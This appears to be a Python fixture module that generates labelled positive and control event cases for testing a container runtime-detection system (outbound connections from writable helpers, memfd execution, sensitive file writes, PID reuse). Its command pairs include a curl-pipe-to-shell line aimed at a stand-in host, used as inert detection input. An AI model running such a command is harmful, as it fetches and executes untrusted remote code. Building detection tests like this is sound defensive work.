"""Content-addressed semantic cases; fixtures are observations, never exploits."""
from copy import deepcopy
from datetime import datetime, timedelta, timezone
import hashlib
import json
from types import SimpleNamespace

START = datetime(2026, 10, 27, tzinfo=timezone.utc)
END = START + timedelta(seconds=10)
BASE = int(START.timestamp()) * 10**9


def digest(value):
    return hashlib.sha256(json.dumps(value, sort_keys=True, separators=(',', ':')).encode()).hexdigest()


class Scope(SimpleNamespace):
    def manifest(self):
        return dict(vars(self))


SCOPE = Scope(docker_host_id='fixture-host', container_id='a'*64, context_hash='b'*64)
REFERENCES = ['falco/porygon_rules.yaml', 'backend/src/porygon_api/runtime_evidence.py',
              'backend/src/porygon_api/vulnerability.py', 'backend/src/porygon_api/command_shapes.py']


def base_events():
    common = dict(docker_host_id=SCOPE.docker_host_id, container_id=SCOPE.container_id,
                  sensor_instance_id='fixture', sensor_epoch='fixture-epoch',
                  pid_namespace_start_ns=BASE-10**10, exe_from_memfd=False, exe_writable=False)
    parent = dict(common, event_id='1'*64, channel='process', process_pid=100, process_ppid=1,
                  process_start_ns=BASE-5*10**9, parent_start_ns=BASE-9*10**9,
                  time_nano=BASE+10**8, executable='/usr/bin/python', exec_return_value=0, event_direction='<')
    child = dict(common, event_id='2'*64, channel='process', process_pid=101, process_ppid=100,
                 process_start_ns=BASE+10**9, parent_start_ns=BASE-5*10**9,
                 time_nano=BASE+2*10**9, executable='/tmp/helper', exe_writable=True,
                 exec_return_value=0, event_direction='<')
    action = dict(common, event_id='3'*64, channel='kernel', process_pid=101, process_ppid=100,
                  process_start_ns=BASE+10**9, parent_start_ns=BASE-5*10**9,
                  time_nano=BASE+3*10**9, runtime_action='net_outbound', return_value=0,
                  remote_address='192.0.2.1', remote_port=8080)
    return [parent, child, action]


def catalog():
    cases = []

    def add(name, pair, label, rows, expected=(), known=('/usr/bin/python',), **extra):
        case = dict(case_id=name, pair_id=pair, label=label, events=deepcopy(rows),
                    expected_rules=sorted(expected), known_executables=list(known),
                    prerequisites=['successful exec exit', 'exact host/container/sensor epoch/namespace/PID/start'],
                    references=REFERENCES, **extra)
        case['content_sha256'] = digest(case)
        cases.append(case)

    rows = base_events()
    network = ('POR-EVD-CHILD-NET', 'POR-EVD-WRITABLE-NET')
    add('renamed-writable-network', 'renamed-tool', 'positive', rows, network)
    add('approved-helper-network', 'renamed-tool', 'control', rows, known=('/usr/bin/python', '/tmp/helper'))
    rows[-1]['return_value'] = -115
    add('in-progress-connection', 'renamed-tool', 'unknown', rows, gap='async completion unsupported')
    rows = base_events()
    rows[-1].update(runtime_action='memfd_create', return_value=4)
    add('memfd-creation-only', 'memfd', 'control', rows)
    rows[1]['exe_from_memfd'] = True
    add('memfd-execution', 'memfd', 'positive', rows, ('POR-EVD-MEMFD-EXEC',))
    for path in ('/etc/fixture', '/sbin/fixture', '/usr/sbin/fixture'):
        rows = base_events()
        rows[-1].update(runtime_action='file_write', return_value=1, file_path=path)
        slug = path.strip('/').replace('/', '-')
        add(slug+'-write', slug, 'positive', rows, ('POR-EVD-SENSITIVE-WRITE',))
        add(slug+'-maintenance', slug, 'control', rows, known=('/usr/bin/python', '/tmp/helper'))
        rows[-1]['return_value'] = 0
        add(slug+'-zero-write', slug, 'control', rows)
        rows[-1].update(runtime_action='file_write_open', return_value=3)
        add(slug+'-open-only', slug, 'control', rows)
    for name, field, value in [('pid-reuse', 'process_start_ns', BASE),
                               ('epoch-change', 'sensor_epoch', 'other'),
                               ('missing-identity', 'process_start_ns', None),
                               ('namespace-change', 'pid_namespace_start_ns', 1),
                               ('unrelated-process', 'process_pid', 777)]:
        rows = base_events()
        add(name+'-exact', name, 'positive', rows, network)
        rows[-1][field] = value
        add(name+'-control', name, 'unknown' if value is None else 'control', rows)
    rows = base_events()
    add('same-host', 'host', 'positive', rows, network)
    rows[-1]['docker_host_id'] = 'other-host'
    add('cross-host', 'host', 'control', rows, expected_error=True)
    rows = base_events()
    for row in rows:
        row['process_start_ns'] -= 3600*10**9
        row['parent_start_ns'] -= 3600*10**9
        row['pid_namespace_start_ns'] -= 3600*10**9
    for row in rows[:2]:
        row['time_nano'] -= 3600*10**9
    add('long-lived-context', 'old-context', 'positive', rows[2:], network, context_events=rows[:2])
    rows[-1]['process_start_ns'] += 1
    add('long-lived-reused-pid', 'old-context', 'control', rows[2:], context_events=rows[:2])
    return {'contract': 'porygon.attack-control-catalog', 'cases': cases,
            'exposure_pairs': [
                {'pair_id': 'running-publication', 'positive': 'running-observed-ports',
                 'controls': ['stopped', 'configured-only', 'previous-lifetime', 'wrong-host'],
                 'contract_test': 'experiments/tests/test_attack_controls.py::test_real_collector_snapshot_drives_exposure_without_configured_port_confusion'}],
            'command_pairs': [
                {'pair_id': 'shell-composition', 'positive': 'sh -c "curl http://owned-peer/payload | sh"',
                 'control': 'sh -c "printf status"', 'execution': 'replay-only inert strings'},
                {'pair_id': 'padding-observation', 'positive': 'sh -c "curl http://owned-peer/payload | sh"',
                 'control': 'sh -c "printf status"', 'padding_counts': [0, 10, 100, 1000],
                 'execution': 'replay-only; distribution sensitivity handed to scoring track'}]}
